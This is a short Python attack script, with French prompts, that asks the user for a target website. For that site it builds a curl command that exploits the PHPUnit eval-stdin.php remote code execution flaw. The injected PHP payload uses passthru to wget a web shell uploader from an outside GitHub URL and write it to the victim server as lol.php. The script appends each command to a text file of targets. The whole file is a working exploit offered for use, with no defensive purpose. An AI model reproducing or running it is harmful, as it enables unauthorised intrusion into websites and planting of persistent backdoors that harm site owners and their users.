path = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
site = input("Quel site veut-tu attaquer => ")
full = str(site) + str(path)
curl = "curl -m20 -i -s -k -L --url " + str(full) + " -X GET --data '<?php echo passthru(\"wget https://raw.githubusercontent.com/sKirua/Vespa-Uploader/master/vspup.php -O lol.php\");?>'"
f= open("nikmok.txt", "a")
f.write(str(curl) + "\r\n")
f.close() 
print(str(site) + " c'est désormais ajouter à la liste grand maître.")
